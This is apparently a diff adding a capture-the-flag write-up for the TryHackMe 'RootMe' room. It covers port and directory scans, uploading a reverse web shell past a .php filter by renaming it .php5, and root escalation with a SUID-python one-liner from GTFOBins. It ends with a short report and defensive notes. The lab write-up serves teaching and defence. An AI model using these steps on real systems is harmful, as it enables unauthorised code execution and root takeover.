@@ -1,0 +1,182 @@
+RootMe
+THM
+
+=============:\\\\\\\\
+RECONAISSANCE:-------->>
+=============:////////
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 d1:e8:fa:ba:b0:a3:e5:0a:83:30:df:b4:68:c5:30:b2 (RSA)
+|   256 a0:56:bc:06:cd:90:74:c8:3d:ce:12:d0:e8:5a:19:bd (ECDSA)
+|_  256 f8:7f:e6:7f:6d:28:d7:10:8d:97:9f:92:cc:b3:62:32 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: HackIT - Home
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Linux 4.X|5.X|2.6.X (96%), Google Android 10.X|11.X|12.X (93%), Adtran embedded (92%)
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/h:adtran:424rg cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:2.6.32
+Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (95%), Linux 5.4 (95%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Adtran 424RG FTTH gateway (92%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+================
+-Scan the machine, how many ports are open?
+-What version of Apache is running?
+-What service is running on port 22?
+
+-All 3 questions above can be answered from the results of the above nmap scan.
+
+
+=============:\\\\\\\\\\
+ENUMERATION:------------->>
+=============://////////
+└─$ gobuster dir -u http://10.81.159.21 -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.81.159.21
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 277]
+/.hta                 (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/css                  (Status: 301) [Size: 310] [--> http://10.81.159.21/css/]
+/index.php            (Status: 200) [Size: 616]
+/js                   (Status: 301) [Size: 309] [--> http://10.81.159.21/js/]
+/panel                (Status: 301) [Size: 312] [--> http://10.81.159.21/panel/]
+/server-status        (Status: 403) [Size: 277]
+/uploads              (Status: 301) [Size: 314] [--> http://10.81.159.21/uploads/]
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+-Find directories on the web server using the GoBuster tool.
+-What is the hidden directory?
+
+-common.txt is a pretty good file to run for initial enumeration. In this case it give us everything we needed with just one scan.
+--the /panel and /uploads directories are the most curious.
+
+=============:\\\\\\\\\\\\
+EXPLOITATION:--------------->>
+=============:////////////
+-the /panel directory allows us to upload a file.
+--let's upload a web-shell.
+---I had the right idea with this: a reverse webshell php. I configured the shell and renamed it after I realised the website was filtering files with the .php extension. It didn't land the first time around because it was called "rootme" with no file extension. I then renamed it to rootme.php5 and set up my listener on port 1234. When I uploaded it to the site, it worked and gave me a shell.
+
+-kali comes pre-installed with some webshells.
+--alternatively, look at https://pentestmonkey.net/tools/web-shells/php-reverse-shell
+
+----the room wants me to find a file called user.txt
+#find / -name user.txt 2>/dev/null
+# cat /var/www/user.txt
+THM{***_***_*_sh3ll}
+
+====================:\\\\\
+PRIVILEGE ESCALATION:----->>>>>
+====================://///
+-Now the room wants us to find a way of escalating privileges so that we can see what is inside the root.txt file.
+--we can run a simple command to find files with SUID permission:
+#find / -perm -4000 -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/python2.7
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/9665/bin/mount
+/snap/core/9665/bin/ping
+/snap/core/9665/bin/ping6
+/snap/core/9665/bin/su
+/snap/core/9665/bin/umount
+/snap/core/9665/usr/bin/chfn
+/snap/core/9665/usr/bin/chsh
+/snap/core/9665/usr/bin/gpasswd
+/snap/core/9665/usr/bin/newgrp
+/snap/core/9665/usr/bin/passwd
+/snap/core/9665/usr/bin/sudo
+/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9665/usr/lib/openssh/ssh-keysign
+/snap/core/9665/usr/lib/snapd/snap-confine
+/snap/core/9665/usr/sbin/pppd
+/snap/core20/2599/usr/bin/chfn
+/snap/core20/2599/usr/bin/chsh
+/snap/core20/2599/usr/bin/gpasswd
+/snap/core20/2599/usr/bin/mount
+/snap/core20/2599/usr/bin/newgrp
+/snap/core20/2599/usr/bin/passwd
+/snap/core20/2599/usr/bin/su
+/snap/core20/2599/usr/bin/sudo
+/snap/core20/2599/usr/bin/umount
+/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2599/usr/lib/openssh/ssh-keysign
+/bin/mount
+/bin/su
+/bin/fusermount
+/bin/umount
+
+#/usr/bin/python seems to run as a SUID - meaning it can run as sudo.
+-we can leverage this to escalate privileges!
+--the room points us to look at gtfobins.org. Search for python
+---it will give you the command below under the SUID tab:
+#python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+---after running this command, you can jump into the root folder and cat the .txt file.
+THM{******3g3_**********}
+
+==============
+Room complete!
+==============
+
+=============:\\\\\\\\\\\\\\\\\\\\\
+REPORTING:-------------------------->>
+=============://///////////////////
+The application suffers from improper file upload validation, allowing an attacker to upload and execute server-side code. While uploads using the .php extension are restricted, the application fails to block the .php5 extension, which is interpreted by the web server as PHP. This weakness enables remote code execution through a malicious file upload.
+
+Additionally, the system is misconfigured and exposes multiple SUID-root binaries. Notably, the Python binary is configured with the SUID bit set and owned by root. This allowed Python to be executed with elevated privileges. By invoking Python to replace the running process with a shell using
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")',
+a shell was spawned that retained root privileges, resulting in full privilege escalation.
+
+====================
+Defensive Takeaways:
+-SUID files
+--run the discovery command we used in this room to find SUID files and your own system.
+---python should definitely not be listed!
